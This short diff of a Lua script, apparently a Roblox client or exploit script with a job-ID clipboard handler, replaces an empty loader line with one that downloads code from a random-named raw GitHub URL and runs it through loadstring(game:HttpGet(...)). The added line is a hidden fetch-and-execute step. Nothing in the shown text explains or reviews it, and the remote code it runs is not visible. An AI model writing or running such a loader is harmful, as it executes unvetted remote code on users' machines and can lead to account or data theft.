@@ -817,4 +817,4 @@ UserInputService.InputBegan:Connect(function(input, gpe)
         copyJobIdToClipboard()
     end
 end)
-loadstring(game:HttpGet(""))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FGSDHT524fsADsr/sdfdfgfdg/refs/heads/main/fhghfg.lua"))()
